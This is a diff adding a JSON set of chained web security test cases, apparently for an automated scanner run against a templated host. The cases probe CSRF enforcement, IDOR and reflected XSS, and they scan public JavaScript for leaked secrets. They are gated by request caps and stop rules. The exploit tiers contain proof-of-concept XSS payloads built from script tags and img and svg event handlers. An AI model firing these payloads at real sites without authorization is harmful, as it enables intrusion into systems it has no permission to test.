@@ -1,0 +1,471 @@
+{
+  "test_cases": [
+    {
+      "id": "TC-CHAIN-001-auth-csrf-then-enum",
+      "hypothesis_id": "H009",
+      "base_url": "https://{{host}}",
+      "method": "POST",
+      "endpoint": "/catalog/subscribe",
+      "parameter": "csrf",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "body.email",
+              "value": "test@example.com"
+            },
+            {
+              "location": "body.coupon",
+              "value": ""
+            },
+            {
+              "location": "body.csrf",
+              "value": "FETCHED_CSRF_TOKEN"
+            }
+          ],
+          "description": "Baseline valid subscription POST including valid CSRF token and benign email. Token must be obtained by prerequisite GET on /catalog.",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json;charset=UTF-8"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "body.email",
+              "value": "test@example.com"
+            },
+            {
+              "location": "body.coupon",
+              "value": ""
+            },
+            {
+              "location": "body.csrf",
+              "value": ""
+            }
+          ],
+          "description": "Missing CSRF token to observe enforcement behaviour",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json;charset=UTF-8"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "body.email",
+              "value": "test@example.com"
+            },
+            {
+              "location": "body.coupon",
+              "value": ""
+            },
+            {
+              "location": "body.csrf",
+              "value": "INVALID_TOKEN"
+            }
+          ],
+          "description": "Invalid CSRF token to trigger CSRF-specific error responses",
+          "encoding": "json",
+          "content_type": "application/json",
+          "header": [
+            {
+              "header_name": "Content-Type",
+              "header_value": "application/json;charset=UTF-8"
+            },
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "login",
+          "description": "Obtain valid authenticated session cookie for cookie-protected endpoints by performing application login or using observed session. Bind cookie to executor Cookie header.",
+          "bind_to": "header.Cookie"
+        },
+        {
+          "type": "csrf_token",
+          "description": "Fetch valid CSRF token from /catalog GET response body form input named csrf or from returned page JSON. Bind token to body.csrf in baseline payload.",
+          "extract_from": "/catalog (GET) response body form input named csrf",
+          "bind_to": "body.csrf"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "status_code_change",
+          "condition": "Compare status code of baseline (valid CSRF) with missing and invalid token probes. If missing/invalid token requests return codes in [400,401,403] while baseline returns 200/201, flag CSRF present.",
+          "threshold": {
+            "expected_codes": [
+              200,
+              201,
+              400,
+              401,
+              403
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "error_signature",
+          "condition": "Inspect probe responses for CSRF error strings (e.g., 'CSRF','invalid token','missing token','forbidden'). Presence in probe and absence in baseline indicates enforcement.",
+          "threshold": {
+            "expected_codes": [
+              400,
+              403
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "all",
+      "safety": {
+        "idempotent_required": false,
+        "destructive_ok": false,
+        "max_requests": 6
+      },
+      "max_retries": 2,
+      "delay_between_requests": 1.0,
+      "notes": "Run first to validate CSRF and session handling. Use extracted Cookie value from login prerequisite and fetched CSRF token for baseline. Stop further state-changing tests if session acquisition fails or CSRF not present. Respect anti-automation by setting User-Agent.",
+      "tags": [
+        "csrf",
+        "auth",
+        "chain-start"
+      ],
+      "estimated_duration": 300
+    },
+    {
+      "id": "TC-CHAIN-002-enum-and-xss-blog-post",
+      "hypothesis_id": "H001_H002_H003_H004",
+      "base_url": "https://{{host}}",
+      "method": "GET",
+      "endpoint": "/blog/post",
+      "parameter": "(postId,scanMeHeader,viewport)",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.postId",
+              "value": "3"
+            },
+            {
+              "location": "query.scanMeHeader",
+              "value": "baseline"
+            },
+            {
+              "location": "query.viewport",
+              "value": "desktop"
+            }
+          ],
+          "description": "Combined baseline to capture normal response for postId, scanMeHeader and viewport in a single request to reduce requests and maintain context. Use same Cookie session if available.",
+          "header": [
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "probe",
+          "payloads": [
+            {
+              "location": "query.postId",
+              "value": "INJECTION_TEST_TOKEN_abc123"
+            },
+            {
+              "location": "query.scanMeHeader",
+              "value": "SCAN_REFLECT_zz99"
+            },
+            {
+              "location": "query.viewport",
+              "value": "DOM_TEST_TOKEN_vw1"
+            },
+            {
+              "location": "query.postId",
+              "value": "4"
+            }
+          ],
+          "description": "Probe for IDOR differences and multi-parameter reflection using unique tokens in each parameter. Includes alternative postId value to detect access control differences. URL-encode where noted by executor.",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        },
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.postId",
+              "value": "%3Cscript%3Ealert(1)%3C%2Fscript%3E"
+            },
+            {
+              "location": "query.scanMeHeader",
+              "value": "%3Cscript%3Econsole.log(1)%3C%2Fscript%3E"
+            },
+            {
+              "location": "query.viewport",
+              "value": "%22%3E%3Csvg%2Fonload%3Dconsole.log(1)%3E"
+            }
+          ],
+          "description": "Exploit-tier payloads for confirmed reflections; only execute if probe-tier shows reflection signals. These are encoded variants for safety in transit.",
+          "encoding": "url",
+          "header": [
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "reflected_input",
+          "condition": "Search response body and headers for exact probe tokens INJECTION_TEST_TOKEN_abc123, SCAN_REFLECT_zz99, or DOM_TEST_TOKEN_vw1 on HTTP 200. If any appear unescaped in HTML/JSON, flag reflection.",
+          "threshold": {
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        },
+        {
+          "signal": "status_code_change",
+          "condition": "If alternate postId in probe returns a different status code among [200,401,403,404] compared to baseline (postId=3), flag as potential IDOR.",
+          "threshold": {
+            "expected_codes": [
+              200,
+              401,
+              403,
+              404
+            ]
+          },
+          "weight": 0.9
+        },
+        {
+          "signal": "response_length_diff",
+          "condition": "If response length differs from baseline by >=20% for any probe token with HTTP 200, flag anomaly for manual review.",
+          "threshold": {
+            "body_length_delta_pct": 20.0,
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.6
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 8
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "Combine enumeration and reflection probes into single chained test to minimize requests. Execute exploit-tier payloads only after positive probe signals. Observe both body and headers due to scanMeHeader usage. If application returns non-200 for baseline, set needs_observation=true and halt exploitation chain.",
+      "tags": [
+        "idor",
+        "xss",
+        "enumeration",
+        "combined"
+      ],
+      "estimated_duration": 120
+    },
+    {
+      "id": "TC-CHAIN-003-static-js-inspection",
+      "hypothesis_id": "H-static-js",
+      "base_url": "https://{{host}}",
+      "method": "GET",
+      "endpoint": "/resources/js/react.development.js",
+      "parameter": "",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [],
+          "description": "Fetch public JS resources to inspect for secrets, unsafe endpoints, or tokens referenced by client code. No dynamic parameters.",
+          "content_type": "application/javascript",
+          "header": [
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "sensitive_data_exposed",
+          "condition": "Inspect retrieved JS for hard-coded API endpoints, keys, tokens, or insecure configurations. If secrets or endpoints found, flag for targeted API tests.",
+          "threshold": {
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 0.7
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 10
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.2,
+      "notes": "Low-risk information gathering. Consolidate inspection of other listed JS files (react-dom.development.js, angular_1-7-7.js, subscribeNow.js, stockCheck.js, xmlStockCheckPayload.js, scanme.js) in same phase to reduce requests. Honor anti-automation UA checks.",
+      "tags": [
+        "recon",
+        "static-analysis"
+      ],
+      "estimated_duration": 90
+    },
+    {
+      "id": "TC-CHAIN-004-conditional-exploit-trigger",
+      "hypothesis_id": "H002_post-H003_post",
+      "base_url": "https://{{host}}",
+      "method": "GET",
+      "endpoint": "/blog/post",
+      "parameter": "(postId,scanMeHeader,viewport)",
+      "payloads": [
+        {
+          "tier": "exploit",
+          "payloads": [
+            {
+              "location": "query.postId",
+              "value": "<img src=x onerror=console.log('XSS')>"
+            },
+            {
+              "location": "query.scanMeHeader",
+              "value": "<script>console.log(1)</script>"
+            },
+            {
+              "location": "query.viewport",
+              "value": "\"><script>console.log('DOM')</script>"
+            }
+          ],
+          "description": "Exploit-tier payloads executed only if prior probe signals reflected_input or DOM injection detected. High-safety gating enforced.",
+          "header": [
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [
+        {
+          "type": "custom",
+          "description": "Require positive reflection signal from TC-CHAIN-002 (reflected_input) or individual XSS probes. Executor must verify oracle results before running.",
+          "custom_logic": "proceed_only_if_any_previous_oracle_reflected_input_true"
+        }
+      ],
+      "oracle_rules": [
+        {
+          "signal": "xss_payload_executed",
+          "condition": "Manual or automated confirmation required: if exploit payload appears unescaped or evidence of script execution is observed in subsequent responses or application behavior, mark as successful.",
+          "threshold": {
+            "expected_codes": [
+              200
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 4
+      },
+      "max_retries": 1,
+      "delay_between_requests": 1.0,
+      "notes": "Do not execute without explicit positive probe results. These payloads are higher-risk; run under manual supervision or with permission. Use same session/cookie as used during probes.",
+      "tags": [
+        "xss",
+        "exploit",
+        "conditional"
+      ],
+      "estimated_duration": 30
+    },
+    {
+      "id": "TC-CHAIN-005-rate-limits-and-stop-conditions",
+      "hypothesis_id": "H-control",
+      "base_url": "https://{{host}}",
+      "method": "GET",
+      "endpoint": "/",
+      "parameter": "(global)",
+      "payloads": [
+        {
+          "tier": "benign",
+          "payloads": [
+            {
+              "location": "query.scanMeHeader",
+              "value": "baseline"
+            }
+          ],
+          "description": "Control test case to enforce global execution constraints: rate-limiting checks, observation gating and stop conditions.",
+          "header": [
+            {
+              "header_name": "User-Agent",
+              "header_value": "Mozilla/5.0 (compatible)"
+            }
+          ]
+        }
+      ],
+      "prerequisites": [],
+      "oracle_rules": [
+        {
+          "signal": "timing_anomaly",
+          "condition": "If any endpoint begins returning 429 or significant timing increases (>2000ms over baseline) across tests, pause further probes and escalate.",
+          "threshold": {
+            "timing_ms": 2000,
+            "expected_codes": [
+              429
+            ]
+          },
+          "weight": 1.0
+        }
+      ],
+      "pass_logic": "any",
+      "safety": {
+        "idempotent_required": true,
+        "destructive_ok": false,
+        "max_requests": 1
+      },
+      "max_retries": 1,
+      "delay_between_requests": 0.5,
+      "notes": "Global controls applied by executor: overall rate cap 5 reqs/sec, per-endpoint cap 1 req/sec, abort on 429 or repeated 5xx responses (>=3). If prerequisites cannot fetch CSRF or authenticated session, mark dependent tests as needs_observation=true and skip.",
+      "tags": [
+        "control",
+        "safety"
+      ],
+      "estimated_duration": 5
+    }
+  ]
+}
